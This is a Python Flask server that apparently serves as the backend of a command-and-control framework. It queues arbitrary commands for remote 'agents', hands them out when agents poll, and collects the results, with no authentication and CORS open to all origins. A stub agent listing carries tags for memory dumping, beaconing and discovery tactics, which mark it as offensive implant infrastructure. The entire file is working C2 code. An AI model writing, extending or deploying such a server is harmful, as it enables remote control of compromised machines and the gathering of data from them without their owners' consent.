from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# In-memory command store and result store
COMMAND_QUEUE = {}
COMMAND_RESULTS = {}

@app.route("/api/command", methods=["POST"])
def handle_command():
    data = request.get_json()
    if not data or "agent_id" not in data or "command" not in data:
        return jsonify({"status": "error", "message": "Missing agent_id or command"}), 400

    agent_id = data["agent_id"]
    command = data["command"]

    print(f"✅ Received command '{command}' for agent '{agent_id}'")
    COMMAND_QUEUE[agent_id] = command
    return jsonify({
        "status": "success",
        "message": f"Command '{command}' queued for agent '{agent_id}'"
    })

@app.route("/api/get-command", methods=["POST"])
def get_command():
    data = request.get_json()
    agent_id = data.get("agent_id")
    command = COMMAND_QUEUE.pop(agent_id, None)
    if command:
        return jsonify({"status": "command", "command": command})
    return jsonify({"status": "idle"})

@app.route("/api/command-result", methods=["POST"])
def store_result():
    data = request.get_json()
    agent_id = data.get("agent_id")
    result = data.get("result")

    if agent_id and result:
        print(f"🟢 Agent {agent_id} responded with:\n{result}")
        COMMAND_RESULTS[agent_id] = result
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route("/api/command-results/<agent_id>", methods=["GET"])
def fetch_result(agent_id):
    result = COMMAND_RESULTS.pop(agent_id, None)
    return jsonify({"result": result})

@app.route("/api/agents", methods=["GET"])
def get_agents():
    # You can enrich this from a real database later
    agents = [
        {
            "agent_id": "A01",
            "hostname": "test-host",
            "ip_address": "10.0.0.5",
            "status": "Online",
            "last_check_in": "Just now",
            "tags": ["🧠 Memory Dumping", "📡 Active Beacon", "🧬 TTP: Discovery"]
        }
    ]
    return jsonify(agents)
